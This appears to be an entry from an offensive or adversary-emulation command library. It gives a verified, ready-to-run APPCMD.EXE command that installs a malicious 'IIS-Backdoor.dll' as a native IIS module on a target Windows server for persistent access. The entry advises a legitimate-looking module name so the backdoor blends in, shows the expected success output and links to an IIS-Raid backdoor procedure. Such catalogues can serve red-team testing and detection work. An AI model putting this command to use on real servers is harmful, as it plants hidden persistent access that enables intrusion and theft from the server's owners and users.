---
id: b14128e8-0e41-4f4d-bf96-68f00fa1d0bf
name: appcmd-install-iis-backdoor-module
type: command
executor: cmd
data: >-
  C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:"$_MODULE_NAME"
  /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
output: null
created_at: '2023-04-06T03:56:27.931476+00:00'
updated_at: '2023-04-10T20:37:21.199886+00:00'
platforms:
  - Windows
tags:
  - persistence
  - iis
verified: true
validated: true
---

# appcmd-install-iis-backdoor-module

## Command

```cmd
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:"$_MODULE_NAME" /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

## Description

Installs a malicious DLL as a native IIS module on the target Windows server, enabling persistent backdoor functionality. This must be executed with administrative privileges on the target system.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /name:"$_MODULE_NAME" | Name for the module (e.g., "LegitModule") to blend in | Yes |
| /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" | Path to the backdoor DLL | Yes |
| /add:true | Adds the module to IIS configuration | Yes |

## Examples

### Basic Usage

```cmd
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:"MyModule" /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

## Expected Output

Module object "MyModule" added

Success confirmation without errors.

## Related

- [[procedures/IIS-Raid-Backdoor-Persistence]]
- [[commands/python-execute-iis-controller]]
